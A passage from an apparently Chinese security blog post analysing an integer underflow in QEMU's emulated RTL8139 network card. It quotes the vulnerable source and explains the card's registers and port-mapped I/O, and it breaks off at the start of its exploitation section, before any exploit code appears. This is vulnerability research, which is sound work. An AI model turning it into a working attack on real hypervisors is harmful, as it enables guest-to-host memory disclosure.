数据包中的数据长度时，在进行减法运算前并没有比较两个操作数的大小关系，通过触发整数溢出使得 <code>ip_data_len</code> 的最大值可以是 <code>0xFFFF</code> 。</p><p>紧接着是发送数据包，如果是 TCP 数据（ <code>IP_PROTO_TCP</code> ）且数据量过大（设置了 <code>CP_TX_LGSEN</code> 标记），则会进行分片处理，即切分成多个 IP 数据包进行发送；此时 <code>ip_data_len</code> 将被用于计算 <code>tcp_data_len</code> 的值：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* pointer to TCP header */</span></span><br><span class="line">tcp_header *p_tcp_hdr = (tcp_header*)(eth_payload_data + hlen);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> tcp_hlen = TCP_HEADER_DATA_OFFSET(p_tcp_hdr);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ETH_MTU = ip header len + tcp header len + payload */</span></span><br><span class="line"><span class="keyword">int</span> tcp_data_len = ip_data_len - tcp_hlen;</span><br><span class="line"><span class="keyword">int</span> tcp_chunk_size = ETH_MTU - hlen - tcp_hlen;</span><br></pre></td></tr></table></figure><p>随后对 <code>tcp_data_len</code> 长度的数据按照 <code>tcp_chunk_size</code> 的大小进行分片发送：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> is_last_frame = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (tcp_send_offset = <span class="number">0</span>; tcp_send_offset &lt; tcp_data_len; </span><br><span class="line">     tcp_send_offset += tcp_chunk_size) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint16_t</span> chunk_size = tcp_chunk_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* check if this is the last frame */</span></span><br><span class="line">    <span class="keyword">if</span> (tcp_send_offset + tcp_chunk_size &gt;= tcp_data_len)</span><br><span class="line">    &#123;</span><br><span class="line">        is_last_frame = <span class="number">1</span>;</span><br><span class="line">        chunk_size = tcp_data_len - tcp_send_offset;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* add 4 TCP pseudoheader fields */</span></span><br><span class="line">    <span class="comment">/* copy IP source and destination fields */</span></span><br><span class="line">    <span class="built_in">memcpy</span>(data_to_checksum, saved_ip_header + <span class="number">12</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (tcp_send_offset)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>((<span class="keyword">uint8_t</span>*)p_tcp_hdr + tcp_hlen, </span><br><span class="line">            (<span class="keyword">uint8_t</span>*)p_tcp_hdr + tcp_hlen + tcp_send_offset, chunk_size);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* keep PUSH and FIN flags only for the last frame */</span></span><br><span class="line">    <span class="keyword">if</span> (!is_last_frame)</span><br><span class="line">    &#123;</span><br><span class="line">        TCP_HEADER_CLEAR_FLAGS(p_tcp_hdr, TCP_FLAG_PUSH|TCP_FLAG_FIN);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* recalculate TCP checksum */</span></span><br><span class="line">    ip_pseudo_header *p_tcpip_hdr = (ip_pseudo_header *)data_to_checksum;</span><br><span class="line">    p_tcpip_hdr-&gt;zeros      = <span class="number">0</span>;</span><br><span class="line">    p_tcpip_hdr-&gt;ip_proto   = IP_PROTO_TCP;</span><br><span class="line">    p_tcpip_hdr-&gt;ip_payload = cpu_to_be16(tcp_hlen + chunk_size);</span><br><span class="line"></span><br><span class="line">    p_tcp_hdr-&gt;th_sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> tcp_checksum = ip_checksum(data_to_checksum, tcp_hlen + chunk_size + <span class="number">12</span>);</span><br><span class="line">    p_tcp_hdr-&gt;th_sum = tcp_checksum;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* restore IP header */</span></span><br><span class="line">    <span class="built_in">memcpy</span>(eth_payload_data, saved_ip_header, hlen);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* set IP data length and recalculate IP checksum */</span></span><br><span class="line">    ip-&gt;ip_len = cpu_to_be16(hlen + tcp_hlen + chunk_size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* increment IP id for subsequent frames */</span></span><br><span class="line">    ip-&gt;ip_id = cpu_to_be16(tcp_send_offset/tcp_chunk_size + be16_to_cpu(ip-&gt;ip_id));</span><br><span class="line"></span><br><span class="line">    ip-&gt;ip_sum = <span class="number">0</span>;</span><br><span class="line">    ip-&gt;ip_sum = ip_checksum(eth_payload_data, hlen);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> tso_send_size = ETH_HLEN + hlen + tcp_hlen + chunk_size;</span><br><span class="line">    rtl8139_transfer_frame(s, saved_buffer, tso_send_size,</span><br><span class="line">        <span class="number">0</span>, (<span class="keyword">uint8_t</span> *) dot1q_buffer);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* add transferred count to TCP sequence number */</span></span><br><span class="line">    p_tcp_hdr-&gt;th_seq = cpu_to_be32(chunk_size + be32_to_cpu(p_tcp_hdr-&gt;th_seq));</span><br><span class="line">    ++send_count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里封装好的 Ethernet Frame 通过函数 <code>rtl8139_transfer_frame</code> 发送，函数部分代码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">rtl8139_transfer_frame</span><span class="params">(RTL8139State *s, <span class="keyword">uint8_t</span> *buf, <span class="keyword">int</span> size,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">int</span> do_interrupt, <span class="keyword">const</span> <span class="keyword">uint8_t</span> *dot1q_buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ------------------------------- cut -------------------------------</span></span><br><span class="line">    <span class="keyword">if</span> (TxLoopBack == (s-&gt;TxConfig &amp; TxLoopBack))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">size_t</span> buf2_size;</span><br><span class="line">        <span class="keyword">uint8_t</span> *buf2;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (iov) &#123;</span><br><span class="line">            buf2_size = iov_size(iov, <span class="number">3</span>);</span><br><span class="line">            buf2 = g_malloc(buf2_size);</span><br><span class="line">            iov_to_buf(iov, <span class="number">3</span>, <span class="number">0</span>, buf2, buf2_size);</span><br><span class="line">            buf = buf2;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        DPRINTF(<span class="string">"+++ transmit loopback mode\n"</span>);</span><br><span class="line">        rtl8139_do_receive(qemu_get_queue(s-&gt;nic), buf, size, do_interrupt);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (iov) &#123;</span><br><span class="line">            g_free(buf2);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ------------------------------- cut -------------------------------</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出，当设置了 <code>TxLoopBack</code> 标记时，会直接调用 <code>rtl8139_do_receive</code> 接收数据，数据会写入到接收缓冲区中。</p><h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h2><h3 id="4-1-RTL8139-网卡简介"><a href="#4-1-RTL8139-网卡简介" class="headerlink" title="4.1 RTL8139 网卡简介"></a>4.1 RTL8139 网卡简介</h3><p>QEMU 模拟的 RTL8139 网卡在发送和接收数据时，内部代码分支的走向很大程度上依赖于网卡的状态，对应的结构体为 <code>RTL8139State</code> （位于文件 <code>hw\net\rtl8139.c</code> 中）：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">RTL8139State</span> &#123;</span></span><br><span class="line">    <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">    PCIDevice parent_obj;</span><br><span class="line">    <span class="comment">/*&lt; public &gt;*/</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span> phys[<span class="number">8</span>]; <span class="comment">/* mac address */</span></span><br><span class="line">    <span class="keyword">uint8_t</span> mult[<span class="number">8</span>]; <span class="comment">/* multicast mask array */</span></span><br><span class="line">    <span class="comment">/* TxStatus0 in C mode*/</span> <span class="comment">/* also DTCCR[0] and DTCCR[1] in C+ mode */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> TxStatus[<span class="number">4</span>];</span><br><span class="line">    <span class="keyword">uint32_t</span> TxAddr[<span class="number">4</span>];   <span class="comment">/* TxAddr0 */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> RxBuf;       <span class="comment">/* Receive buffer */</span></span><br><span class="line">    <span class="comment">/* internal variable, receive ring buffer size in C mode */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> RxBufferSize;</span><br><span class="line">    <span class="keyword">uint32_t</span> RxBufPtr;</span><br><span class="line">    <span class="keyword">uint32_t</span> RxBufAddr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint16_t</span> IntrStatus;</span><br><span class="line">    <span class="keyword">uint16_t</span> IntrMask;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> TxConfig;</span><br><span class="line">    <span class="keyword">uint32_t</span> RxConfig;</span><br><span class="line">    <span class="keyword">uint32_t</span> RxMissed;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint16_t</span> CSCR;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span>  Cfg9346;</span><br><span class="line">    <span class="keyword">uint8_t</span>  Config0;</span><br><span class="line">    <span class="keyword">uint8_t</span>  Config1;</span><br><span class="line">    <span class="keyword">uint8_t</span>  Config3;</span><br><span class="line">    <span class="keyword">uint8_t</span>  Config4;</span><br><span class="line">    <span class="keyword">uint8_t</span>  Config5;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span>  clock_enabled;</span><br><span class="line">    <span class="keyword">uint8_t</span>  bChipCmdState;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint16_t</span> MultiIntr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint16_t</span> BasicModeCtrl;</span><br><span class="line">    <span class="keyword">uint16_t</span> BasicModeStatus;</span><br><span class="line">    <span class="keyword">uint16_t</span> NWayAdvert;</span><br><span class="line">    <span class="keyword">uint16_t</span> NWayLPAR;</span><br><span class="line">    <span class="keyword">uint16_t</span> NWayExpansion;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint16_t</span> CpCmd;</span><br><span class="line">    <span class="keyword">uint8_t</span>  TxThresh;</span><br><span class="line"></span><br><span class="line">    NICState *nic;</span><br><span class="line">    NICConf conf;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* C ring mode */</span></span><br><span class="line">    <span class="keyword">uint32_t</span>   currTxDesc;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* C+ mode */</span></span><br><span class="line">    <span class="keyword">uint32_t</span>   cplus_enabled;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span>   currCPlusRxDesc;</span><br><span class="line">    <span class="keyword">uint32_t</span>   currCPlusTxDesc;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span>   RxRingAddrLO;</span><br><span class="line">    <span class="keyword">uint32_t</span>   RxRingAddrHI;</span><br><span class="line"></span><br><span class="line">    EEprom9346 eeprom;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span>   TCTR;</span><br><span class="line">    <span class="keyword">uint32_t</span>   TimerInt;</span><br><span class="line">    <span class="keyword">int64_t</span>    TCTR_base;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Tally counters */</span></span><br><span class="line">    RTL8139TallyCounters tally_counters;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Non-persistent data */</span></span><br><span class="line">    <span class="keyword">uint8_t</span>   *cplus_txbuffer;</span><br><span class="line">    <span class="keyword">int</span>        cplus_txbuffer_len;</span><br><span class="line">    <span class="keyword">int</span>        cplus_txbuffer_offset;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* PCI interrupt timer */</span></span><br><span class="line">    QEMUTimer *timer;</span><br><span class="line"></span><br><span class="line">    MemoryRegion bar_io;</span><br><span class="line">    MemoryRegion bar_mem;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Support migration to/from old versions */</span></span><br><span class="line">    <span class="keyword">int</span> rtl8139_mmio_io_addr_dummy;</span><br><span class="line">&#125; RTL8139State;</span><br></pre></td></tr></table></figure><p><code>RTL8139State</code> 结构体中的许多字段实际上就是 RTL8139 网卡内部的寄存器，关于这些寄存器的描述，可以参考厂商 Realtek 提供的 Datasheet 手册 [8]，下图为 Phrack 文章 [1] 提供的介绍（这里为 RTL8139 网卡在 C+ 模式下的寄存器介绍）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">        +---------------------------+----------------------------+</span><br><span class="line">0x00    |           MAC0            |            MAR0            |</span><br><span class="line">        +---------------------------+----------------------------+</span><br><span class="line">0x10    |                       TxStatus0                        |</span><br><span class="line">        +--------------------------------------------------------+</span><br><span class="line">0x20    |                        TxAddr0                         |</span><br><span class="line">        +-------------------+-------+----------------------------+</span><br><span class="line">0x30    |        RxBuf      |ChipCmd|                            |</span><br><span class="line">        +-------------+------+------+----------------------------+</span><br><span class="line">0x40    |   TxConfig  |  RxConfig   |            ...             |</span><br><span class="line">        +-------------+-------------+----------------------------+</span><br><span class="line">        |                                                        |</span><br><span class="line">        |             skipping irrelevant registers              |</span><br><span class="line">        |                                                        |</span><br><span class="line">        +---------------------------+--+------+------------------+</span><br><span class="line">0xd0    |           ...             |  |TxPoll|      ...         |</span><br><span class="line">        +-------+------+------------+--+------+--+---------------+</span><br><span class="line">0xe0    | CpCmd |  ... |RxRingAddrLO|RxRingAddrHI|    ...        |</span><br><span class="line">        +-------+------+------------+------------+---------------+</span><br></pre></td></tr></table></figure><ul><li>TxConfig：发送数据相关的配置参数</li><li>RxConfig：接收数据相关的配置参数</li><li>CpCmd：C+ 模式相关配置参数，比如：<ul><li>CplusRxEnd 表示启用接收</li><li>CplusTxEnd 表示启用发送</li></ul></li><li>TxAddr0：Tx descriptors table 相关的物理内存地址<ul><li>0x20 ~ 0x27：Transmit Normal Priority Descriptors Start Address</li><li>0x28 ~ 0x2F：Transmit High Priority Descriptors Start Address</li></ul></li><li>RxRingAddrLO：Rx descriptors table 物理内存地址低 32 位</li><li>RxRingAddrHI：Rx descriptors table 物理内存地址高 32 位</li><li>TxPoll：让网卡检查 Tx descriptors</li></ul><p>关于 <code>Descriptor</code> 的定义，同样可以参考厂商 Realtek 提供的 Datasheet 手册 [8]，下图为 <code>Transmit Descriptor</code> 的定义：</p><p><img src="/uploads/202006/transmit-descriptor.png" alt="RTL8139 网卡 Transmit Descriptor"></p><p>Phrack 文章 [1] 给出的结构体的定义如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtl8139_desc</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> dw0;</span><br><span class="line">    <span class="keyword">uint32_t</span> dw1;</span><br><span class="line">    <span class="keyword">uint32_t</span> buf_lo;</span><br><span class="line">    <span class="keyword">uint32_t</span> buf_hi;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="4-2-Port-Mapped-I-O"><a href="#4-2-Port-Mapped-I-O" class="headerlink" title="4.2 Port Mapped I/O"></a>4.2 Port Mapped I/O</h3><p>CPU 可以通过以下两种方式和外设进行交互（这里不讨论 IRQ、DMA 等其他交互方式）：</p><ul><li>Memory Mapped I/O 即 MMIO</li><li>Port Mapped I/O 即 PMIO</li></ul><p>MMIO 将外设的内存和寄存器直接映射到系统的地址空间中（这部分空间通常是保留给外设专用的），这样 CPU 通过普通的汇编指令即可和外设进行交互；而 PMIO 则将外设的内存和寄存器映射到隔离的地址空间中（PMIO 地址空间的大小为 64KB），CPU 通过 <code>in</code> 和 <code>out</code> 指令和外设进行交互。</p><p>在 Windows 下，可以通过设备管理器查看设备的 PMIO 地址范围，下图为 VMware SVGA 3D 的 PMIO 地址区间之一：</p><p><img src="/uploads/202006/vmware-svga-3d-pmio.png" alt="VMware SVGA 3D PMIO"></p><p>在 Linux 下可以使用 pciutils 中的 <code>lspci</code> 查看设备的 PMIO 地址区间 [9]，这里测试用的 Ubuntu Server 已经自带了 pciutils，只需要在启动时添加 RTL8139 网卡即可，启动命令如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> x86_64-softmmu/qemu-system-x86_64 -<span class="built_in">enable</span>-kvm -m 2048 -drive \</span></span><br><span class="line">    file=~/Desktop/vm/ubuntu.img,format=qcow2,if=ide,cache=writeback \</span><br><span class="line">    -netdev user,id=t0, -device rtl8139,netdev=t0,id=nic0 \</span><br><span class="line">    -net user,hostfwd=tcp::2222-:22 -net nic</span><br></pre></td></tr></table></figure><p>这里最后一行的作用是把 Ubuntu Server 虚拟机的 22 端口转发到主机的 2222 端口，方便主机通过 SSH 访问虚拟机（VNC Viewer 无法复制粘贴），在主机中执行以下命令即可连接虚拟机：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ssh vmusername@127.0.0.1 -p 2222</span></span><br></pre></td></tr></table></figure><p>通过 <code>lspci</code> 命令可以看到 RTL8139 网卡的 PMIO 的起始地址为 <code>0xC000</code> ，大小为 <code>256</code> 字节：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> lspci</span></span><br><span class="line">00:00.0 Host bridge: Intel Corporation 440FX - 82441FX PMC [Natoma] (rev 02)</span><br><span class="line">00:01.0 ISA bridge: Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]</span><br><span class="line">00:01.1 IDE interface: Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II]</span><br><span class="line">00:01.3 Bridge: Intel Corporation 82371AB/EB/MB PIIX4 ACPI (rev 03)</span><br><span class="line">00:02.0 VGA compatible controller: Device 1234:1111 (rev 02)</span><br><span class="line">00:03.0 Ethernet controller: Intel Corporation 82540EM Gigabit Ethernet Controller (rev 03)</span><br><span class="line">00:04.0 Ethernet controller: Realtek Semiconductor Co., Ltd. RTL-8100/8101L/8139 PCI Fast Ethernet Adapter (rev 20)</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> lspci -s 00:04.0 -v</span></span><br><span class="line">00:04.0 Ethernet controller: Realtek Semiconductor Co., Ltd. RTL-8100/8101L/8139 PCI Fast Ethernet Adapter (rev 20)</span><br><span class="line">Subsystem: Red Hat, Inc. QEMU Virtual Machine</span><br><span class="line">Physical Slot: 4</span><br><span class="line">Flags: bus master, fast devsel, latency 0, IRQ 10</span><br><span class="line">I/O ports at c000 [size=256]</span><br><span class="line">Memory at febf1000 (32-bit, non-prefetchable) [size=256]</span><br><span class="line">Expansion ROM at feb80000 [disabled] [size=256K]</span><br><span class="line">Kernel driver in use: 8139cp</span><br><span class="line">Kernel modules: 8139cp, 8139too</span><br></pre></td></tr></table></figure><h3 id="4-3-PMIO-读写"><a href="#4-3-PMIO-读写" class="headerlink" title="4.3 PMIO 读写"></a>4.3 PMIO 读写</h3><p>通过结构体 <code>RTL8139State</code> 的成员 <code>bar_io</code> 的交叉引用可以定位到函数 <code>pci_rtl8139_realize</code> ，这里对 PMIO 和 MMIO 进行了初始化操作：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">pci_rtl8139_realize</span><span class="params">(PCIDevice *dev, Error **errp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    RTL8139State *s = RTL8139(dev);</span><br><span class="line">    DeviceState *d = DEVICE(dev);</span><br><span class="line">    <span class="keyword">uint8_t</span> *pci_conf;</span><br><span class="line"></span><br><span class="line">    pci_conf = dev-&gt;config;</span><br><span class="line">    pci_conf[PCI_INTERRUPT_PIN] = <span class="number">1</span>;    <span class="comment">/* interrupt pin A */</span></span><br><span class="line">    <span class="comment">/* <span class="doctag">TODO:</span> start of capability list, but no capability</span></span><br><span class="line"><span class="comment">     * list bit in status register, and offset 0xdc seems unused. */</span></span><br><span class="line">    pci_conf[PCI_CAPABILITY_LIST] = <span class="number">0xdc</span>;</span><br><span class="line"></span><br><span class="line">    memory_region_init_io(&amp;s-&gt;bar_io, OBJECT(s), &amp;rtl8139_io_ops, s,</span><br><span class="line">                          <span class="string">"rtl8139"</span>, <span class="number">0x100</span>);</span><br><span class="line">    memory_region_init_io(&amp;s-&gt;bar_mem, OBJECT(s), &amp;rtl8139_mmio_ops, s,</span><br><span class="line">                          <span class="string">"rtl8139"</span>, <span class="number">0x100</span>);</span><br><span class="line">    pci_register_bar(dev, <span class="number">0</span>, PCI_BASE_ADDRESS_SPACE_IO, &amp;s-&gt;bar_io);</span><br><span class="line">    pci_register_bar(dev, <span class="number">1</span>, PCI_BASE_ADDRESS_SPACE_MEMORY, &amp;s-&gt;bar_mem);</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PMIO 的读写函数可以从变量 <code>rtl8139_io_ops</code> 中找到：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> MemoryRegionOps rtl8139_io_ops = &#123;</span><br><span class="line">    .read = rtl8139_ioport_read,</span><br><span class="line">    .write = rtl8139_ioport_write,</span><br><span class="line">    .impl = &#123;</span><br><span class="line">        .min_access_size = <span class="number">1</span>,</span><br><span class="line">        .max_access_size = <span class="number">4</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    .endianness = DEVICE_LITTLE_ENDIAN,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>PMIO 写函数 <code>rtl8139_ioport_write</code> 的定义如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">rtl8139_ioport_write</span><span class="params">(<span class="keyword">void</span> *opaque, hwaddr addr,</span></span></span><br><span class="line"><span class="function"><span class="params">                                 <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (size) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        rtl8139_io_writeb(opaque, addr, val);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        rtl8139_io_writew(opaque, addr, val);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        rtl8139_io_writel(opaque, addr, val);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写的长度可以是字节、字、双字，这里以字节为单位的 PMIO 写函数为 <code>rtl8139_io_writeb</code> ，定义如下：</p><figure class="highlight cpp"><table><tr><td 